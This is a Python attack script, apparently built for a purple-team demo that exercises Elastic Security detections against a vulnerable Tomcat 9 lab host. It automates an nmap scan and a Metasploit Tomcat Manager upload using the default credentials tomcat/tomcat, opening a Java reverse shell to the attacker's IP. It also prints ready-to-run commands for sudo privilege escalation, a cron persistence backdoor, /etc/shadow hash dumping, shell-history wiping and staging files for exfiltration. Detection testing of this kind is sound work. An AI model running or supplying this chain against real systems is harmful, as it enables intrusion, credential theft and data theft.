#!/usr/bin/env python3
"""Tomcatastrophe - Automated Purple Team Attack Script.

This script automates the attack chain for the Elastic Security purple team demo.
By default, it runs reconnaissance and initial access to get a shell on the target.
Additional attack phases (3-8) can be run individually if desired.

Prerequisites:
    - Nmap installed (apt install nmap)
    - Metasploit Framework installed (msfconsole)
    - Target must have vulnerable Tomcat 9.0.30 with weak credentials
    - Network connectivity between attacker and target

Expected Detections (Elastic 9.2) - Default phases trigger 1-3:
    1. Potential SYN-Based Port Scan Detected (OOTB) [Phase 0]
    2. Tomcat Manager Web Shell Deployment (Custom) [Phase 1]
    3. Potential Reverse Shell via Java (OOTB) [Phase 1]
    4. Linux System Information Discovery via Getconf (OOTB) [Phase 3 - Manual]
    5. Sudo Command Enumeration Detected (OOTB) [Phase 4 - Manual]
    6. Cron Job Created or Modified (OOTB) [Phase 5 - Manual]
    7. Potential Shadow File Read via Command Line Utilities (OOTB) [Phase 6 - Manual]
    8. Tampering of Shell Command-Line History (OOTB) [Phase 7 - Manual]
    9. Sensitive Files Compression (OOTB) [Phase 8 - Manual]
"""

import argparse
import subprocess
import sys
import tempfile
from dataclasses import dataclass
from enum import Enum
from pathlib import Path
from typing import NoReturn, Optional


class Color(str, Enum):
    """ANSI color codes for terminal output."""

    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    YELLOW = "\033[1;33m"
    BLUE = "\033[0;34m"
    MAGENTA = "\033[0;35m"
    CYAN = "\033[0;36m"
    RESET = "\033[0m"


class MITREPhase(Enum):
    """MITRE ATT&CK phases for the attack chain."""

    RECONNAISSANCE = (0, "T1046", "Network Service Discovery")
    INITIAL_ACCESS = (1, "T1190", "Exploit Public-Facing Application")
    DISCOVERY = (3, "T1082, T1033", "System/User Discovery")
    PRIVILEGE_ESCALATION = (4, "T1548", "Abuse Elevation Control")
    PERSISTENCE = (5, "T1053.003", "Cron Job")
    CREDENTIAL_ACCESS = (6, "T1003.008", "/etc/passwd and /etc/shadow")
    DEFENSE_EVASION = (7, "T1070.003", "Clear Command History")
    COLLECTION = (8, "T1074.001", "Local Data Staging")

    def __init__(self, phase_num: int, technique_id: str, technique_name: str):
        self.phase_num = phase_num
        self.technique_id = technique_id
        self.technique_name = technique_name


@dataclass
class AttackConfig:
    """Configuration for the attack execution."""

    target_ip: str
    attacker_ip: str
    interactive: bool = True
    phase: Optional[int] = None


class Logger:
    """Colored logger for terminal output."""

    @staticmethod
    def info(message: str) -> None:
        """Log an informational message."""
        print(f"{Color.BLUE}[INFO]{Color.RESET} {message}")

    @staticmethod
    def success(message: str) -> None:
        """Log a success message."""
        print(f"{Color.GREEN}[SUCCESS]{Color.RESET} {message}")

    @staticmethod
    def warning(message: str) -> None:
        """Log a warning message."""
        print(f"{Color.YELLOW}[WARNING]{Color.RESET} {message}")

    @staticmethod
    def error(message: str) -> None:
        """Log an error message."""
        print(f"{Color.RED}[ERROR]{Color.RESET} {message}", file=sys.stderr)

    @staticmethod
    def phase(message: str) -> None:
        """Log a phase header."""
        separator = "=" * 80
        print(f"\n{Color.MAGENTA}{separator}{Color.RESET}")
        print(f"{Color.MAGENTA}{message}{Color.RESET}")
        print(f"{Color.MAGENTA}{separator}{Color.RESET}\n")


class AttackExecutor:
    """Executes the various phases of the attack chain."""

    def __init__(self, config: AttackConfig):
        self.config = config
        self.logger = Logger()

    def pause_interactive(self, message: str = "Press Enter to continue...") -> None:
        """Pause execution in interactive mode."""
        if self.config.interactive:
            print()
            input(message)
            print()

    def phase_0_reconnaissance(self) -> None:
        """Phase 0: Reconnaissance (T1046 - Network Service Discovery)."""
        self.logger.phase(
            "PHASE 0: RECONNAISSANCE (T1046 - Network Service Discovery)"
        )

        self.logger.info("TCP port scan to identify open services")
        self.logger.warning("Expected Detection: Potential SYN-Based Port Scan Detected")

        self.pause_interactive()

        # TCP connect scan on common ports with service version detection
        self.logger.info(f"Running nmap scan on target: {self.config.target_ip}")

        try:
            subprocess.run(
                [
                    "nmap",
                    "-sT",
                    "-p",
                    "22,80,443,8080,8443",
                    "-Pn",
                    "-sV",
                    "--open",
                    self.config.target_ip,
                ],
                check=True,
            )
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Nmap scan failed: {e}")
            sys.exit(1)
        except FileNotFoundError:
            self.logger.error("Nmap not found. Please install nmap.")
            sys.exit(1)

        self.logger.success("✓ Port scanning complete")
        self.pause_interactive("Review nmap results. Press Enter to continue to Initial Access...")

    def phase_1_initial_access(self) -> None:
        """Phase 1: Initial Access (T1190 - Exploit Public-Facing Application)."""
        self.logger.phase(
            "PHASE 1: INITIAL ACCESS (T1190 - Exploit Public-Facing Application)"
        )

        self.logger.info("Exploiting Tomcat Manager with weak credentials (tomcat/tomcat)")
        self.logger.warning("Expected Detections:")
        self.logger.warning("  - Tomcat Manager Web Shell Deployment (Custom)")
        self.logger.warning("  - Potential Reverse Shell via Java (OOTB)")

        self.pause_interactive()

        # Create Metasploit resource script
        rc_content = f"""# Start persistent handler
use exploit/multi/handler
set payload java/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j

# Wait for handler to start
sleep 2

# Run Tomcat exploit
back
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS {self.config.target_ip}
set RPORT 8080
set HttpUsername tomcat
set HttpPassword tomcat
set TARGETURI /manager
set FingerprintCheck false
set payload java/shell_reverse_tcp
set LHOST {self.config.attacker_ip}
set LPORT 4444
set DisablePayloadHandler true
show options
exploit

# Check for sessions
sleep 5
sessions -l
"""

        # Write to temporary file
        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".rc", delete=False, prefix="tomcat_exploit_"
        ) as rc_file:
            rc_file_path = Path(rc_file.name)
            rc_file.write(rc_content)
            self.logger.info(f"Creating Metasploit resource script: {rc_file_path}")

        try:
            self.logger.info("Starting Metasploit Framework...")
            self.logger.info(
                "A persistent handler will start on port 4444, then the exploit will execute"
            )
            print()

            subprocess.run(["msfconsole", "-r", str(rc_file_path)], check=True)

        except subprocess.CalledProcessError as e:
            self.logger.error(f"Metasploit execution failed: {e}")
            rc_file_path.unlink(missing_ok=True)
            sys.exit(1)
        except FileNotFoundError:
            self.logger.error("Metasploit not found. Please install msfconsole.")
            rc_file_path.unlink(missing_ok=True)
            sys.exit(1)
        finally:
            # Cleanup
            rc_file_path.unlink(missing_ok=True)

        self.logger.success("✓ Initial access phase complete")
        print()
        self.logger.info("If you have a shell session:")
        self.logger.info("  - Use 'sessions -l' to list sessions")
        self.logger.info("  - Use 'sessions -i <ID>' to interact with a session")
        self.logger.info("  - Run commands like: whoami, id, hostname, uname -a")
        print()

    def phase_3_discovery(self) -> None:
        """Phase 3: Discovery (T1082, T1033 - System/User Discovery)."""
        self.logger.phase("PHASE 3: DISCOVERY (T1082, T1033 - System/User Discovery)")

        self.logger.info("System and user information discovery")
        self.logger.warning(
            "Expected Detection: Linux System Information Discovery via Getconf"
        )

        self.pause_interactive()

        self.logger.info("Run these commands in your Meterpreter shell session:")

        print(
            """
    shell
    whoami
    id
    uname -a
    hostname
    cat /etc/passwd | grep -v nologin

    # Enumerate system configuration using getconf
    getconf -a
    getconf LONG_BIT
    getconf PAGE_SIZE

    exit
"""
        )

        self.pause_interactive("After running discovery commands, press Enter to continue...")

    def phase_4_privilege_escalation(self) -> None:
        """Phase 4: Privilege Escalation (T1548 - Abuse Elevation Control)."""
        self.logger.phase(
            "PHASE 4: PRIVILEGE ESCALATION (T1548 - Abuse Elevation Control)"
        )

        self.logger.info("Sudo privilege enumeration and escalation")
        self.logger.warning("Expected Detection: Sudo Command Enumeration Detected")

        self.pause_interactive()

        self.logger.info("Run these commands in your Meterpreter shell session:")

        print(
            """
    shell

    # Enumerate sudo permissions
    sudo -l
    sudo -V

    # Escalate to root
    sudo /bin/bash
    whoami    # Should show 'root'

    exit
"""
        )

        self.pause_interactive("After privilege escalation, press Enter to continue...")

    def phase_5_persistence(self) -> None:
        """Phase 5: Persistence (T1053.003 - Cron Job)."""
        self.logger.phase("PHASE 5: PERSISTENCE (T1053.003 - Cron Job)")

        self.logger.info("Establishing persistent backdoor via cron")
        self.logger.warning("Expected Detection: Cron Job Created or Modified")

        self.pause_interactive()

        self.logger.info("Run these commands in msfconsole:")

        print(
            f"""
    background

    use exploit/linux/local/persistence_cron
    set SESSION 1
    set LHOST {self.config.attacker_ip}
    set LPORT 4445
    run
"""
        )

        self.pause_interactive("After establishing persistence, press Enter to continue...")

    def phase_6_credential_access(self) -> None:
        """Phase 6: Credential Access (T1003.008 - /etc/passwd and /etc/shadow)."""
        self.logger.phase(
            "PHASE 6: CREDENTIAL ACCESS (T1003.008 - Password Hash Dumping)"
        )

        self.logger.info("Dumping password hashes from /etc/shadow")
        self.logger.warning(
            "Expected Detection: Potential Shadow File Read via Command Line Utilities"
        )

        self.pause_interactive()

        self.logger.info("Run these commands in msfconsole:")

        print(
            """
    use post/linux/gather/hashdump
    set SESSION 1
    run

    # View collected credentials
    loot
    creds
"""
        )

        self.pause_interactive("After credential dumping, press Enter to continue...")

    def phase_7_defense_evasion(self) -> None:
        """Phase 7: Defense Evasion (T1070.003 - Clear Command History)."""
        self.logger.phase(
            "PHASE 7: DEFENSE EVASION (T1070.003 - Clear Command History)"
        )

        self.logger.info("Tampering with shell command history")
        self.logger.warning(
            "Expected Detection: Tampering of Shell Command-Line History"
        )

        self.pause_interactive()

        self.logger.info("Run these commands in your Meterpreter shell session:")

        print(
            """
    sessions -i 1
    shell

    unset HISTFILE
    export HISTSIZE=0
    history -c

    exit
"""
        )

        self.pause_interactive("After clearing history, press Enter to continue...")

    def phase_8_collection(self) -> None:
        """Phase 8: Collection (T1074.001 - Local Data Staging)."""
        self.logger.phase("PHASE 8: COLLECTION (T1074.001 - Local Data Staging)")

        self.logger.info("Staging sensitive files and compressing for exfiltration")
        self.logger.warning("Expected Detection: Sensitive Files Compression")

        self.pause_interactive()

        self.logger.info("Run these commands in your Meterpreter shell session:")

        print(
            """
    shell

    # Stage sensitive files in hidden directory
    mkdir /tmp/.staging
    find /home -name "*.pdf" -exec cp {} /tmp/.staging/ \\; 2>/dev/null
    find /home -name "*.doc*" -exec cp {} /tmp/.staging/ \\; 2>/dev/null
    find /etc -name "*.conf" -exec cp {} /tmp/.staging/ \\; 2>/dev/null

    # Compress staged data for exfiltration
    tar -czf /tmp/data.tar.gz /tmp/.staging
    zip -r /tmp/backup.zip /tmp/.staging 2>/dev/null

    exit
"""
        )

        self.pause_interactive("Data staging complete. Press Enter to finish...")

    def run_all_phases(self) -> None:
        """Execute reconnaissance and initial access phases (default)."""
        self.phase_0_reconnaissance()
        self.phase_1_initial_access()

        self.logger.phase("INITIAL ACCESS COMPLETE")
        self.logger.success("✓ Reconnaissance and initial access phases executed")
        self.logger.info("You should now have a shell session on the target")
        print()
        self.logger.info("Next steps:")
        self.logger.info("  1. Interact with your session: sessions -i <ID>")
        self.logger.info("  2. Run discovery commands manually (see phase 3-8 for ideas)")
        self.logger.info("  3. Check Elastic Security UI (ec-dev) for triggered detections")
        print()
        self.logger.info("To run additional phases manually, use: --phase <number>")

    def run_specific_phase(self, phase: int) -> None:
        """Execute a specific attack phase."""
        phase_map = {
            0: self.phase_0_reconnaissance,
            1: self.phase_1_initial_access,
            3: self.phase_3_discovery,
            4: self.phase_4_privilege_escalation,
            5: self.phase_5_persistence,
            6: self.phase_6_credential_access,
            7: self.phase_7_defense_evasion,
            8: self.phase_8_collection,
        }

        if phase not in phase_map:
            self.logger.error(f"Invalid phase number: {phase}")
            self.logger.info("Valid phases: 0, 1, 3, 4, 5, 6, 7, 8")
            sys.exit(1)

        phase_map[phase]()

    def execute(self) -> None:
        """Execute the attack based on configuration."""
        if self.config.phase is not None:
            self.run_specific_phase(self.config.phase)
        else:
            self.run_all_phases()


def list_phases() -> None:
    """Display available attack phases."""
    print(
        """
Available Attack Phases:
========================

Phase 0: Reconnaissance (T1046)
  - TCP port scan with nmap
  - Detection: Potential SYN-Based Port Scan Detected

Phase 1: Initial Access (T1190)
  - Tomcat Manager exploitation with weak credentials
  - Meterpreter reverse shell deployment
  - Detections: Tomcat Web Shell, Reverse Shell via Java

Phase 3: Discovery (T1082, T1033)
  - System information enumeration with getconf
  - Detection: Linux System Information Discovery via Getconf

Phase 4: Privilege Escalation (T1548)
  - Sudo enumeration and escalation
  - Detection: Sudo Command Enumeration Detected

Phase 5: Persistence (T1053.003)
  - Cron-based backdoor installation
  - Detection: Cron Job Created or Modified

Phase 6: Credential Access (T1003.008)
  - Password hash dumping from /etc/shadow
  - Detection: Potential Shadow File Read

Phase 7: Defense Evasion (T1070.003)
  - Shell history clearing and tampering
  - Detection: Tampering of Shell Command-Line History

Phase 8: Collection (T1074.001)
  - Sensitive file staging and compression
  - Detection: Sensitive Files Compression
"""
    )


def parse_arguments() -> argparse.Namespace:
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description="Tomcatastrophe - Automated Purple Team Attack Script",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Run reconnaissance and get initial access (default)
  %(prog)s --target 10.0.1.50 --attacker 10.0.1.100

  # Run automatically without pauses
  %(prog)s --target 10.0.1.50 --attacker 10.0.1.100 --auto

  # Run specific phase (e.g., phase 0 - reconnaissance only)
  %(prog)s --target 10.0.1.50 --attacker 10.0.1.100 --phase 0

  # List available phases
  %(prog)s --list
""",
    )

    parser.add_argument(
        "-t",
        "--target",
        type=str,
        metavar="IP",
        help="Target IP address (Blue Team VM)",
    )

    parser.add_argument(
        "-a",
        "--attacker",
        type=str,
        metavar="IP",
        help="Attacker IP address (Red Team VM)",
    )

    parser.add_argument(
        "-p",
        "--phase",
        type=int,
        metavar="N",
        choices=[0, 1, 3, 4, 5, 6, 7, 8],
        help="Run specific phase (0-8)",
    )

    parser.add_argument(
        "--auto",
        action="store_true",
        help="Run all phases automatically without pauses",
    )

    parser.add_argument(
        "-l", "--list", action="store_true", help="List available phases"
    )

    return parser.parse_args()


def main() -> NoReturn:
    """Main entry point for the script."""
    args = parse_arguments()

    # Handle --list flag
    if args.list:
        list_phases()
        sys.exit(0)

    # Validate required arguments
    if not args.target or not args.attacker:
        Logger.error("Target and attacker IP addresses are required")
        Logger.info("Use --help for usage information")
        sys.exit(1)

    # Create configuration
    config = AttackConfig(
        target_ip=args.target,
        attacker_ip=args.attacker,
        interactive=not args.auto,
        phase=args.phase,
    )

    # Display configuration
    logger = Logger()
    logger.info("Tomcatastrophe Attack Configuration")
    logger.info(f"Target IP: {config.target_ip}")
    logger.info(f"Attacker IP: {config.attacker_ip}")
    logger.info(f"Interactive Mode: {config.interactive}")

    if config.phase is not None:
        logger.info(f"Running Phase: {config.phase}")
    else:
        logger.info("Running: All Phases")

    print()

    if config.interactive:
        input("Press Enter to start the attack chain...")

    # Execute attack
    executor = AttackExecutor(config)
    executor.execute()

    logger.success("Tomcatastrophe complete!")
    sys.exit(0)


if __name__ == "__main__":
    main()
